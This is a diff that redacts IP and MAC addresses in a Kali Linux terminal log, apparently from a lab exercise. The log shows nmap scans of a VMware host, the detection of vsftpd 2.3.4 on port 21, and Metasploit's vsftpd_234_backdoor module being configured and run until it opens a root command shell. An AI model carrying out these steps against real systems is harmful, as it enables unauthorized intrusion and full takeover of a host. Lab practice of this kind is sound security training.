@@ -1,7 +1,7 @@
 ──(kali㉿kali)-[~]
-└─$ nmap 192.168.248.129
+└─$ nmap x.x.x.x.
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 14:49 EST
-Nmap scan report for 192.168.248.129
+Nmap scan report for x.x.x.x
 Host is up (0.0018s latency).
 Not shown: 977 closed tcp ports (reset)
 PORT     STATE SERVICE
@@ -28,19 +28,19 @@ PORT     STATE SERVICE
 6667/tcp open  irc
 8009/tcp open  ajp13
 8180/tcp open  unknown
-MAC Address: 00:0C:29:D2:33:27 (VMware)
+MAC Address: x:x:x:x:x:x (VMware)
 
 Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
                                                                                                
 ┌──(kali㉿kali)-[~]
-└─$ nmap -p 21 -sV 192.168.248.129 
+└─$ nmap -p 21 -sV x.x.x.x 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 14:50 EST
-Nmap scan report for 192.168.248.129
+Nmap scan report for x.x.x.x
 Host is up (0.00071s latency).
 
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
-MAC Address: 00:0C:29:D2:33:27 (VMware)
+MAC Address: x:x:x:x:x:x (VMware)
 Service Info: OS: Unix
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
@@ -120,8 +120,8 @@ Exploit target:
 
 View the full module info with the info, or info -d command.
 
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.248.129
-RHOSTS => 192.168.248.129
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS x.x.x.x
+RHOSTS => x.x.x.x
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
 [-] Unknown command: Ooptions. Did you mean options? Run the help command for more details.
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options
@@ -136,7 +136,7 @@ Module options (exploit/unix/ftp/vsftpd_234_backdoor):
    CPORT                     no        The local client port
    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][
                                        ...]
-   RHOSTS   192.168.248.129  yes       The target host(s), see https://docs.metasploit.com/docs
+   RHOSTS   x.x.x.x  yes       The target host(s), see https://docs.metasploit.com/docs
                                        /using-metasploit/basics/using-metasploit.html
    RPORT    21               yes       The target port (TCP)
 
@@ -153,9 +153,9 @@ View the full module info with the info, or info -d command.
 
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 
 
-[*] 192.168.248.129:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 192.168.248.129:21 - USER: 331 Please specify the password.
-[+] 192.168.248.129:21 - Backdoor service has been spawned, handling...
-[+] 192.168.248.129:21 - UID: uid=0(root) gid=0(root)
+[*] x.x.x.x:x - Banner: 220 (vsFTPd 2.3.4)
+[*] x.x.x.x:x- USER: 331 Please specify the password.
+[+] x.x.x.x:x - Backdoor service has been spawned, handling...
+[+] x.x.x.x:x - UID: uid=0(root) gid=0(root)
 [*] Found shell.
-[*] Command shell session 1 opened (192.168.248.128:43193 -> 192.168.248.129:6200) at 2025-01-15 14:54:59 -0500
+[*] Command shell session 1 opened (x.x.x.x:x -> x.x.x.x:x) at 2025-01-15 14:54:59 -0500
